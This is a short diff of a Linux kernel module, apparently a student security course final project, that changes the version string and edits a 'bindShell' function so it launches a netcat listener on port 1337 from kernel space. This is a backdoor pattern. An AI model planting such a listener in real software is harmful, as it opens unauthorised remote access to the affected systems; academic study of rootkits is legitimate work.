@@ -8,7 +8,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Tristan Fletcher (@Cyclawps52)");
 MODULE_DESCRIPTION("CSC492 Final Project");
-MODULE_VERSION("delta-rev2");
+MODULE_VERSION("delta-rev4");
 
 // PROTOTYPES - MOVE TO .H FILE LATER
 int initModule(void);
@@ -148,7 +148,7 @@ static int makePipe(void){
 
 static int bindShell(void){
 	//makePipe();
-	char* argv[] = {"/bin/nc", "-l", "1337", ">/dev/null", "&", NULL};
+	char* argv[] = {"/bin/nc", "-l", "1337", NULL};
 	static char* env[] = {
 		"HOME=/",
 		"TERM=linux",
